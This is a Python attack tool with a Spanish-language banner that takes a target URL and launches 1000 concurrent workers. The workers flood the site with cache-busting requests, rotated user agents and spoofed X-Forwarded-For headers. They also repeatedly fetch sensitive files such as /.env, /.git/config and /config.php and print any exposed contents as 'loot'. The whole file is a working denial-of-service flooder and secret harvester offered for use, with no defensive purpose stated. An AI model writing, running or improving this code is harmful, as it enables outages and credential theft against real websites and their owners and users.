import asyncio
import aiohttp
import random
import os
import sys
from colorama import Fore, Style, init

init()

# Identidades para infiltración indetectable
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Kali; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1"
]

VULNS = ["/.env", "/config.php", "/.git/config", "/admin/config.json"]

def banner():
    os.system('clear')
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("████████████████████████████████████████████████████████████")
    print("█   SENTINELA-ULTIMATE: ELISANDRO EDITION (DESPIADADO)     █")
    print("█   MODO: ATAQUE MASIVO + AUTO-EXPLOTACIÓN + BYPASS        █")
    print("████████████████████████████████████████████████████████████")
    print(f"{Style.RESET_ALL}")

async def asalto_total(url, session, worker_id):
    while True:
        try:
            # 1. ATAQUE DE SATURACIÓN (FLOOD)
            bypass_url = f"{url}?elisandro={random.randint(1,999999)}"
            headers = {
                'User-Agent': random.choice(UAS),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Cache-Control': 'no-cache'
            }
            
            async with session.get(bypass_url, headers=headers, timeout=1.5) as r:
                # 2. AUTO-EXPLOTACIÓN: Si encontramos una puerta, entramos
                for v in VULNS:
                    v_url = f"{url.rstrip('/')}{v}"
                    async with session.get(v_url, headers=headers, timeout=2) as rv:
                        if rv.status == 200:
                            print(f"\n{Fore.RED}[!!!] ¡PUERTA ABIERTA DETECTADA!: {v}")
                            botin = await rv.text()
                            print(f"{Fore.GREEN}[BOTÍN EXTRAÍDO]: {botin[:100]}...")
        except:
            pass

async def main():
    banner()
    
    # EL APARTADO QUE PEDISTE PARA PEGAR EL ENLACE
    print(f"{Fore.CYAN}↓↓↓ PEGA EL ENLACE DEL OBJETIVO AQUÍ Y DALE A ENTER ↓↓↓{Style.RESET_ALL}")
    target = input(f"{Fore.YELLOW}URL OBJETIVO: {Style.RESET_ALL}").strip()
    
    if not target.startswith("http"):
        print(f"{Fore.RED}[!] ERROR: URL INVÁLIDA.")
        return

    print(f"\n{Fore.GREEN}[⚡] INICIANDO INFILTRACIÓN Y ATAQUE DE UN MILLÓN DE RÁFAGAS...")
    
    # 1500 conexiones para máxima potencia desde Kali/Termux
    connector = aiohttp.TCPConnector(limit=1500, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asalto_total(target, session, i) for i in range(1000)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
